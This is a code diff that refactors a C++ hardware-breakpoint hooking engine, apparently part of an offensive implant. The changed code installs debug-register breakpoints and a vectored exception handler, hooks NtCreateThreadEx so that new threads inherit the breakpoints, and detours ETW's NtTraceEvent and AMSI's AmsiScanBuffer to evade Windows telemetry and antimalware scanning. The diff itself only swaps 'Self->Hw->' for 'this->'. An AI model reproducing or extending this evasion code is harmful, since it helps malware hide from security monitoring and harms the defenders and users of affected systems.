@@ -59,7 +59,7 @@ auto DECLFN HwbpEng::Install(
 
     Self->Ntdll.RtlLeaveCriticalSection( CritSec);
 
-    return Self->Hw->Insert(Address, Drx, TRUE, ThreadID);
+    return this->Insert(Address, Drx, TRUE, ThreadID);
 }
 
 auto DECLFN HwbpEng::SetBreak(
@@ -261,7 +261,7 @@ auto DECLFN HwbpEng::Insert(
                 if ( ThreadID != HW_ALL_THREADS && ThreadID != HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) ) 
                     continue;
 
-                if ( ! SetBreak( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ), Address, Drx, Init ) ) goto _KH_END;
+                if ( ! this->SetBreak( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ), Address, Drx, Init ) ) goto _KH_END;
             }
 
             break;
@@ -293,7 +293,7 @@ auto DECLFN HwbpEng::Init( VOID ) -> BOOL {
     NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)this;
 
     Handler = Self->Ntdll.RtlAddVectoredExceptionHandler( 
-        1, (PVECTORED_EXCEPTION_HANDLER)Self->Hw->MainThunk
+        1, (PVECTORED_EXCEPTION_HANDLER)this->MainThunk
     );
 
 
@@ -346,7 +346,7 @@ auto DECLFN HwbpEng::MainHandler(
                 Current->Processed = TRUE;
             }
     
-            if ( ! SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, FALSE ) ) {
+            if ( ! this->SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, FALSE ) ) {
                 goto _KH_END;
             }
     
@@ -355,7 +355,7 @@ auto DECLFN HwbpEng::MainHandler(
             Detour( e->ContextRecord, this );
     
     
-            if ( ! SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, TRUE ) ) {
+            if ( ! this->SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, TRUE ) ) {
                 goto _KH_END;
             }
 
@@ -385,9 +385,7 @@ auto DECLFN HwbpEng::HookCallback(
     Self->Ntdll.RtlEnterCriticalSection( CritSec );
     while ( Current ) {
         if ( Current->Address && Current->Detour && Current->ThreadID == HW_ALL_THREADS ) {
-    
-            Install( Current->Address, Current->Drx, (PVOID)Current->Detour, Current->ThreadID ); i++; 
-    
+            this->Install( Current->Address, Current->Drx, (PVOID)Current->Detour, Current->ThreadID ); i++;     
         }
 
         if ( i == 4 ) break;
@@ -402,7 +400,7 @@ auto DECLFN HwbpEng::HookCallback(
 auto DECLFN HwbpEng::AddNewThreads(
     _In_ INT8 Drx
 ) -> BOOL {
-    return Install( U_PTR( Self->Ntdll.NtCreateThreadEx ), Drx, (PVOID)Self->Hw->NtCreateThreadExHkThunk, HW_ALL_THREADS );
+    return Install( U_PTR( Self->Ntdll.NtCreateThreadEx ), Drx, (PVOID)this->NtCreateThreadExHkThunk, HW_ALL_THREADS );
 }
 
 auto DECLFN HwbpEng::RmNewThreads(
@@ -423,7 +421,7 @@ auto DECLFN HwbpEng::NtCreateThreadExHk(
 
     this->HookCallbackArg.Parameter = Handle;
     Self->Ntdll.RtlCreateTimer( 
-        &Timer, NULL, reinterpret_cast<WAITORTIMERCALLBACKFUNC>(&HwbpEng::HookCallbackThunk), this, 0, 0, 0 
+        &Timer, NULL, reinterpret_cast<WAITORTIMERCALLBACKFUNC>( &this->HookCallbackThunk ), this, 0, 0, 0 
     );
 
     CONTINUE_EXEC( Ctx );
@@ -439,26 +437,26 @@ auto DECLFN HwbpEng::NtCreateThreadExHkThunk(
 auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
     if( !Init() ) return FALSE;
 
-    if ( !Self->Hw->Etw.NtTraceEvent ) {
-        Self->Hw->Etw.NtTraceEvent = (UPTR)LdrLoad::Api<UPTR>( Self->Ntdll.Handle, Hsh::Str( "NtTraceEvent" ) );
-        KhDbg("NtTraceEvent %p %X", Self->Hw->Etw.NtTraceEvent, Self->Hw->Etw.NtTraceEvent );
+    if ( !this->Etw.NtTraceEvent ) {
+        this->Etw.NtTraceEvent = (UPTR)LdrLoad::Api<UPTR>( Self->Ntdll.Handle, Hsh::Str( "NtTraceEvent" ) );
+        KhDbg("NtTraceEvent %p %X", this->Etw.NtTraceEvent, this->Etw.NtTraceEvent );
     }
 
-    if ( !Self->Hw->Amsi.Handle ) {
-        Self->Hw->Amsi.Handle = Self->Lib->Load( "amsi.dll" );
+    if ( !this->Amsi.Handle ) {
+        this->Amsi.Handle = Self->Lib->Load( "amsi.dll" );
 
-        if ( Self->Hw->Amsi.Handle ) {
-            Self->Hw->Amsi.AmsiScanBuffer = (UPTR)LdrLoad::Api<UPTR>( Self->Hw->Amsi.Handle, Hsh::Str( "AmsiScanBuffer" ) );
-            KhDbg("AmsiScanBuffer %p %X", Self->Hw->Amsi.AmsiScanBuffer, Self->Hw->Amsi.AmsiScanBuffer );
+        if ( this->Amsi.Handle ) {
+            this->Amsi.AmsiScanBuffer = (UPTR)LdrLoad::Api<UPTR>( this->Amsi.Handle, Hsh::Str( "AmsiScanBuffer" ) );
+            KhDbg("AmsiScanBuffer %p %X", this->Amsi.AmsiScanBuffer, this->Amsi.AmsiScanBuffer );
         }
     }
 
-    Install( Self->Hw->Etw.NtTraceEvent, Dr1, (PVOID)Self->Hw->EtwThunk, Self->Session.ThreadID );
-    return Install( Self->Hw->Amsi.AmsiScanBuffer, Dr2, (PVOID)Self->Hw->AmsiThunk, Self->Session.ThreadID );
+    this->Install( this->Etw.NtTraceEvent, Dr1, (PVOID)this->EtwThunk, Self->Session.ThreadID );
+    return this->Install( this->Amsi.AmsiScanBuffer, Dr2, (PVOID)this->AmsiThunk, Self->Session.ThreadID );
 }
 
 auto DECLFN HwbpEng::DotnetExit( VOID ) -> BOOL {
-    return Clean();
+    return this->Clean();
 }
 
 auto DECLFN HwbpEng::EtwDetour(
